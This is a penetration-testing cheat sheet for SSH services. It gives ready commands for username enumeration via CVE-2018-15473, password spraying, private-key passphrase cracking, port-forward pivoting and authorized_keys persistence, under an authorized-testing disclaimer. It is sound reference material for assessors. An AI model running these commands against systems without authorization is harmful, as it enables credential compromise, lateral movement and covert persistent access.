---
service: ssh
title: SSH
ports: 22
aliases: openssh, dropbear, sshd
---

# SSH — quick wins

**When you see it:** 22/tcp open (or non-standard port), banner shows OpenSSH version →
note the version immediately: pre-7.7 is user-enumerable, and weak algorithm support
(flagged by ssh-audit) narrows the attack surface.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to or change state
> on the target. Password spraying risks account lockout — confirm lockout policy first.

## Triage (read-only)
```sh
nc -nv H 22                                        # raw banner (OpenSSH_X.Y)
ssh-audit H                                        # algorithms, ciphers, CVEs, Terrapin flag
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o PreferredAuthentications=none USER@H 2>&1 | grep -i 'authentication methods'
nmap -Pn -p22 --script ssh-auth-methods,ssh-hostkey H
```

## Quick wins

### Username enumeration — CVE-2018-15473
```sh
# Python PoC (OpenSSH 2.3 – 7.7):
python3 ssh-username-enum.py --port 22 H --userList WORDLIST
# or Metasploit:
msf> use auxiliary/scanner/ssh/ssh_enumusers
msf> set RHOSTS H; set USER_FILE WORDLIST; run
```
*Why:* OpenSSH ≤7.7 responds differently to valid vs invalid usernames during public-key
auth due to a timing/parsing difference in `SSH_MSG_USERAUTH_REQUEST` handling. Confirmed
valid usernames feed directly into password spray or key search. CVE-2018-15473.

### Password spray (lockout caution)
```sh
hydra -L USERS_FILE -P WORDLIST -t 4 -W 3 ssh://H
# or: nxc ssh H -u USERS_FILE -p WORDLIST --no-bruteforce
```
*Why:* SSH often accepts password auth (check `auth_methods` triage output). `-t 4`/`-W 3`
slows the rate. **Check lockout policy before running** — many systems lock after 3–5
failures. Target accounts you already know exist (from user enum above).

### Weak / crackable private key
```sh
# Find exposed key material:
ssh-keyscan H                                    # grab host public key
grep -r "BEGIN.*PRIVATE KEY" /found/path/        # look for leaked private keys

# Crack passphrase-protected key:
python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=WORDLIST id_rsa.hash
hashcat -m 22921 id_rsa.hash WORDLIST             # hashcat RSA-4096 mode varies
ssh -i id_rsa USER@H
```
*Why:* keys found in repos, backup files, or `.ssh/` during file-share/FTP access often
have weak or no passphrases. `ssh2john` extracts the hash; john/hashcat cracks it offline.

### ssh-audit — flag weak algos and Terrapin
```sh
ssh-audit H
ssh-audit -p PORT H                              # non-default port
```
*Why:* reports deprecated KEX (diffie-hellman-group1), weak MACs (MD5/96-bit),
cipher-only modes, and Terrapin (CVE-2023-48795, requires on-path MitM to exploit).
Copy the `ssh-audit` JSON output — it forms the evidence base for algorithm-hardening
findings.

### Local port forward (reach internal service)
```sh
ssh -L LPORT:INTERNAL_H:IPORT USER@H -N -f
# then: curl http://127.0.0.1:LPORT/
```
*Why:* once you have SSH creds or a key, `-L` tunnels an internal-only service
(e.g., 127.0.0.1:8080 on the target) to your LPORT. `-N -f` daemonises without a shell.

### Remote port forward (callback through NAT)
```sh
ssh -R ATT_PORT:127.0.0.1:ATT_PORT USER@H -N
```
*Why:* useful when the target cannot reach you directly; the target initiates the SSH
connection outbound, and you connect to ATT_PORT on your box.

### Dynamic SOCKS proxy (full pivot)
```sh
ssh -D 1080 USER@H -N -f
proxychains nmap -Pn -sT -p 22,80,443 INTERNAL_TARGET
```
*Why:* `-D` turns the SSH tunnel into a SOCKS5 proxy for your whole toolchain;
`proxychains` routes any tool through it to reach hosts that only H can see.

### authorized_keys persistence ✏️
```sh
# From attacker box — requires write access to target user's home:
ssh-keygen -t ed25519 -f ./pivot_key -N ''
cat pivot_key.pub | ssh USER@H "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
ssh -i pivot_key USER@H
```
*Why:* adds your public key to the target user's `authorized_keys` for persistent
key-based access. **Clean up during debrief**: remove the added line.

## aranum helpers
- `aranumtoolkit/network/enum-ssh.sh` — banner grab, ssh-audit, auth-method probe,
  optional nxc cred check; surfaces CVE-2018-15473 hint when version ≤7.7.
- `standalones/linux/` — post-access privilege-escalation helpers once you have a shell
  (sudo enum, SUID, cron, capabilities, etc.).

## Gotchas
- `PasswordAuthentication no` is increasingly the default on modern distros; check
  `auth_methods` output — if `publickey` only, pivot to key hunting rather than spraying.
- Fail2ban / MaxAuthTries (default 6) will lock you out quickly; throttle aggressively
  and use `-t 1` if lockout policy is unknown.
- Non-default ports (2222, 2200, etc.) are common on internet-facing boxes — rescan with
  `-sV` if nmap shows port 22 closed but SSH is expected.
- Terrapin (CVE-2023-48795) requires an active MitM position on the connection; it is a
  note-worthy finding but not a standalone quick win.
- ssh-audit may not be installed; `pip3 install ssh-audit` or use the GitHub release.

## Sources
- HackTricks `pentesting-ssh`; Hackviser SSH; Exploit-DB 45233 / 45939 (CVE-2018-15473);
  CVE-2023-48795 (Terrapin, Pentest Partners); GTFOBins ssh (port forward abuse).
